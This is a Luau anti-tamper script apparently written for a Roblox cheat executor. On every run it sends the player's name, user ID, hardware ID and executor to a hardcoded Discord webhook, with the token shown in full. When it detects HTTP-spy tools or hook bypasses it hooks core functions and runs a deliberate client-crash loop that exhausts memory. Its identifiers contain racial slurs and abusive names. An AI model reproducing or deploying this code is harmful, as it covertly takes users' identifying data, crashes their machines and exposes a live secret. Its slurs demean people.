local Analytics = game:GetService("RbxAnalyticsService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")

local BaseHWID = gethwid()
local GetClientIdRef = Analytics.GetClientId
local AlreadyDetected = false

local function YourMomGay(DetectionType: string, IsAuth: boolean?)
    pcall(function()
        local Executor = identifyexecutor() or "Unknown"
        local Color = IsAuth and 5763719 or 15158332
        local Emoji = IsAuth and "✅" or "⛔"
        
        request({
            Url = "https://discord" .. ".com/api/web" .. "hooks/1467048050655625349/TlCiiteQD8a6n9bxMZ12ltADoSPG_4puUmpwLevQZKvqqli-lROEzjmg7c3JlA3GJsrO",
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({
                embeds = {{
                    title = IsAuth and "Script Executed" or "Anti-Tamper Detection",
                    color = Color,
                    thumbnail = {url = "https://api.newstargeted.com/roblox/users/v1/avatar-headshot?userid=" .. LocalPlayer.UserId .. "&size=150x150&format=Png&isCircular=false"},
                    fields = {
                        {name = IsAuth and "Status" or "Detection Type", value = Emoji .. " " .. DetectionType, inline = false},
                        {name = "Username", value = LocalPlayer.Name, inline = true},
                        {name = "User ID", value = tostring(LocalPlayer.UserId), inline = true},
                        {name = "Game", value = MarketplaceService:GetProductInfo(game.PlaceId).Name, inline = false},
                        {name = "HWID", value = "`" .. BaseHWID .. "`", inline = false},
                        {name = "Executor", value = Executor, inline = true}
                    },
                    timestamp = os.date("!%Y-%m-%dT%H:%M:%S"),
                    footer = {text = "PSS"}
                }}
            })
        })
    end)
end

local function GetRektSkid()
    while true do
        local Table = {}
        while true do
            for Index = 1, 1e9 do
                Table[Index] = string.rep("crash", 1e6)
                Instance.new("Part").Parent = workspace
            end
        end
    end
end

local function KrabbyPattyFormula(ReportReason: string, KickReason: string)
    if AlreadyDetected then return end
    AlreadyDetected = true
    
    task.spawn(function()
        YourMomGay(ReportReason, false)
        task.wait(0.5)
        LocalPlayer:Kick(KickReason .. " Report sent to server. If you believe this was a mistake, make a ticket in LOOEJ server.")
        task.wait(0.1)
        GetRektSkid()
    end)
end

local HasToopSpy = isfolder("ToopSpy") or isfile("ToopSpy/cfg.json")
local HasKetamine = isfolder("Ketamine") or isfile("Ketamine/Settings.bool")

if HasToopSpy and HasKetamine then
    YourMomGay("ToopSpy and Ketamine folders detected", false)
    LocalPlayer:Kick("ToopSpy and Ketamine detected. Delete both folders and rejoin. If you believe this was a mistake, make a ticket in LOOEJ server.")
    return
elseif HasToopSpy then
    YourMomGay("ToopSpy folder detected", false)
    LocalPlayer:Kick("ToopSpy detected. Delete ToopSpy folder and rejoin. If you believe this was a mistake, make a ticket in LOOEJ server.")
    return
elseif HasKetamine then
    YourMomGay("Ketamine folder detected", false)
    LocalPlayer:Kick("Ketamine detected. Delete Ketamine folder and rejoin. If you believe this was a mistake, make a ticket in LOOEJ server.")
    return
end

task.spawn(function()
    task.wait(2)

    local Success1, Error1 = pcall(function()
        LocalPlayer.Kick(workspace, "Test")
    end)

    local Success2, Error2 = pcall(function()
        workspace:Kick("Test")
    end)

    if Success1 or Error1 ~= "Expected ':' not '.' calling member function Kick" then
        KrabbyPattyFormula("Anti-kick detected (Method: Kick function tampering 0x1)", "Anti-kick bypass detected.")
    end

    if Success2 or not string.match(Error2 or "", "^Kick is not a valid member of Workspace") then
        KrabbyPattyFormula("Anti-kick detected (Method: Kick function tampering 0x2)", "Anti-kick bypass detected.")
    end

    if #Players:GetPlayers() > 1 then
        for _, OtherPlayer in ipairs(Players:GetPlayers()) do
            if OtherPlayer ~= LocalPlayer and OtherPlayer.Parent == Players then
                local Success3, Error3 = pcall(LocalPlayer.Kick, OtherPlayer, "Test")
                local Success4, Error4 = pcall(function()
                    OtherPlayer:Kick("Test")
                end)

                if Success3 or Error3 ~= "Cannot kick a non-local Player from a LocalScript" then
                    KrabbyPattyFormula("Anti-kick detected (Method: Multi-player kick tampering 0x3)", "Anti-kick bypass detected.")
                end

                if Success4 or Error4 ~= "Cannot kick a non-local Player from a LocalScript" then
                    KrabbyPattyFormula("Anti-kick detected (Method: Multi-player kick tampering 0x4)", "Anti-kick bypass detected.")
                end
                break
            end
        end
    end

    local Success5, Error5 = pcall(function()
        LocalPlayer:KicK("Test")
    end)

    if Success5 or not string.match(Error5 or "", "is not a valid member of Player") then
        KrabbyPattyFormula("Anti-kick detected (Method: Case-sensitive kick bypass)", "Anti-kick bypass detected.")
    end

    local TestRemote = Instance.new("RemoteEvent")

    local Success6, Error6 = pcall(function()
        TestRemote:fireserver()
    end)

    local Success7, Error7 = pcall(function()
        TestRemote.FireServer(workspace)
    end)

    local Success8, Error8 = pcall(function()
        workspace:FireServer()
    end)

    if Success6 or not string.match(Error6 or "", "is not a valid member of RemoteEvent") then
        KrabbyPattyFormula("Anti-kick detected (Method: FireServer hook 0x1)", "Anti-kick bypass detected.")
    end

    if Success7 or Error7 ~= "Expected ':' not '.' calling member function FireServer" then
        KrabbyPattyFormula("Anti-kick detected (Method: FireServer hook 0x2)", "Anti-kick bypass detected.")
    end

    if Success8 or not string.match(Error8 or "", "^FireServer is not a valid member of Workspace") then
        KrabbyPattyFormula("Anti-kick detected (Method: FireServer hook 0x3)", "Anti-kick bypass detected.")
    end

    TestRemote:Destroy()
end)

local EPSTEIN_DIDNT_KILL_HIMSELF = {}
local NiggasTriedIt = {}

local FuckYouSkid = restorefunction
restorefunction = function(Func)
    if NiggasTriedIt[Func] then
        KrabbyPattyFormula("Attempted to restore protected function (Method: restorefunction detection) - Bypassing anti-tamper", "Anti-tamper bypass detected.")
    end
    return FuckYouSkid(Func)
end

local BackupPrint
BackupPrint = hookfunction(print, function(...)
    local Args = {...}
    for _, Arg in ipairs(Args) do
        if type(Arg) == "string" then
            local Lower = Arg:lower()
            if Lower:find("discord%.com/api/webhooks") or Lower:find("webhook") then
                YourMomGay("Webhook printed to console (Method: Print hook) - Using Ketamine, ToopSpy or similar", false)
                GetRektSkid()
            end
        end
    end
    return BackupPrint(...)
end)
NiggasTriedIt[print] = true

local BackupWarn
BackupWarn = hookfunction(warn, function(...)
    local Args = {...}
    for _, Arg in ipairs(Args) do
        if type(Arg) == "string" then
            local Lower = Arg:lower()
            if Lower:find("discord%.com/api/webhooks") or Lower:find("webhook") then
                YourMomGay("Webhook warned to console (Method: Warn hook) - Using Ketamine, ToopSpy or similar", false)
                GetRektSkid()
            end
        end
    end
    return BackupWarn(...)
end)
NiggasTriedIt[warn] = true

local BackupClipboard = setclipboard or toclipboard or setrbxclipboard
if BackupClipboard then
    local NiceTryRetard
    NiceTryRetard = hookfunction(BackupClipboard, function(...)
        local Args = {...}
        if #Args > 0 and type(Args[1]) == "string" then
            local Text = Args[1]
            local Lower = Text:lower()
            if Lower:find("discord%.com/api/webhooks") or Lower:find("webhook") then
                KrabbyPattyFormula("Webhook copied to clipboard (Method: Clipboard hook) - Using Ketamine, ToopSpy or similar", "Possible HTTP spy detected.")
                return NiceTryRetard("Nice try buddy")
            end
        end
        return NiceTryRetard(...)
    end)
    NiggasTriedIt[setclipboard] = true
    if toclipboard then NiggasTriedIt[toclipboard] = true end
    if setrbxclipboard then NiggasTriedIt[setrbxclipboard] = true end
end

for Key, Value in pairs(getgenv()) do
    if type(Value) == "function" then
        EPSTEIN_DIDNT_KILL_HIMSELF[Value] = true
    end
end

YourMomGay("Authenticated", true)

local SussyNiggas: {string} = {
    "discord%.com/api/webhooks",
    "HttpSpy",
    "RequestLogger", 
    "ToopSpy",
    "HTTP SPY",
    "REQUEST SPY",
    "WEBHOOK SPY",
    "Method:",
    "URL:",
    "Body:",
    "Headers:",
    "Response:",
    "Status Code:"
}

local Metatable = getrawmetatable(game)
setreadonly(Metatable, false)

local OldIndex = Metatable.__index
Metatable.__index = newcclosure(function(self, key)
    local Result = OldIndex(self, key)
    
    if key == "Text" and type(Result) == "string" then
        for _, Pattern in pairs(SussyNiggas) do
            if Result:match(Pattern) then
                KrabbyPattyFormula("Possible HTTP spy detected (Method: GUI text detection) - Using Ketamine, ToopSpy or similar", "Possible HTTP spy detected.")
            end
        end
    end
    
    return Result
end)

local OldNewindex = Metatable.__newindex
Metatable.__newindex = newcclosure(function(self, key, value)
    if key == "Text" and type(value) == "string" then
        for _, Pattern in pairs(SussyNiggas) do
            if value:match(Pattern) then
                KrabbyPattyFormula("Possible HTTP spy detected (Method: GUI text modification) - Using Ketamine, ToopSpy or similar", "Possible HTTP spy detected.")
            end
        end
    end
    
    return OldNewindex(self, key, value)
end)

setreadonly(Metatable, true)

task.spawn(function()
    while task.wait(1) do
        if gethwid() ~= BaseHWID then
            KrabbyPattyFormula("HWID spoofing detected (Method: HWID comparison)", "HWID spoofing detected.")
        end
        
        local ClientIdA = Analytics:GetClientId()
        local ClientIdB = Analytics.GetClientId(Analytics)
        if ClientIdA ~= ClientIdB then
            KrabbyPattyFormula("ClientId spoofing detected (Method: Namecall vs direct call)", "ClientId spoofing detected.")
        end
        
        local ClientIdC = GetClientIdRef(Analytics)
        if ClientIdA ~= ClientIdC then
            KrabbyPattyFormula("ClientId spoofing detected (Method: Function reference vs namecall)", "ClientId spoofing detected.")
        end
        
        local RequestFunc = request or http_request or (syn and syn.request) or (fluxus and fluxus.request)
        if RequestFunc then
            local Success, Error = pcall(RequestFunc)
            if Success or (Error and not Error:lower():find("table")) then
                KrabbyPattyFormula("HTTP request function hooked (Method: Request validation) - Using Ketamine, ToopSpy or similar", "Possible HTTP spy detected.")
            end
        end
        
        for Key, Value in pairs(getgenv()) do
            if type(Value) == "function" and not EPSTEIN_DIDNT_KILL_HIMSELF[Value] then
                local Info = debug.getinfo(Value, "sln")
                if Info.what ~= "C" then
                    KrabbyPattyFormula("Hooked function detected in getgenv (Method: Non-C closure detection) - Using Ketamine, ToopSpy or similar", "Possible HTTP spy detected.")
                end
            end
        end
    end
end)
